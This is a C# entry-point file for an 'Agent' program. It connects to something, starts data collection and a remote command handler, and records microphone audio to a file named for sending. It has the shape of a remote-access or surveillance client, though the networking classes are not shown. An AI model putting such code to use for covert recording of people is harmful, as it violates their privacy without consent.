using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Agent
{
    class Program
    {
        public static Connection connection ;
        public static DataCollect dataCollect;
        public static CommandHandler command;
        public static Welcoming welcoming;
        private static NAudio.Wave.WaveIn sourceStream;
        private static NAudio.Wave.WaveFileWriter streamWriter;

        static void Main(string[] args)
        {
            Console.WriteLine("starting....");
            connection = new Connection();
            dataCollect = new DataCollect();
            command = new CommandHandler();
            welcoming = new Welcoming();
            connection.connect();
            dataCollect.startCollecting();
            command.startHandling();
            welcoming.startWelcoming();
            Console.WriteLine("ready....");
            Console.Read();
        }
        static public void record()
        {
            //Program.panel.record();
            string filePath = Environment.CurrentDirectory + "/recordingToSend.wav";
            sourceStream = new NAudio.Wave.WaveIn();
            sourceStream.DeviceNumber = 0;
            sourceStream.WaveFormat = new NAudio.Wave.WaveFormat(44100, 1);
            streamWriter = new NAudio.Wave.WaveFileWriter(filePath, sourceStream.WaveFormat);
            sourceStream.DataAvailable += new EventHandler<NAudio.Wave.WaveInEventArgs>(sourceStream_DataAvailable);
            sourceStream.StartRecording();
        }
        static public void sourceStream_DataAvailable(object sender, NAudio.Wave.WaveInEventArgs e)
        {
            Console.WriteLine("sesuatu");
            if (streamWriter == null)
                return;
            streamWriter.WriteData(e.Buffer, 0, e.BytesRecorded);
            streamWriter.Flush();
        }
        static public void stopRecording()
        {
            //Program.panel.stopRecording();\

            if (sourceStream != null)
            {
                sourceStream.StopRecording();
                sourceStream.Dispose();
                sourceStream = null;

            }
            if (streamWriter != null)
            {
                streamWriter.Dispose();
                streamWriter = null;
            }
        }
        
    }
}
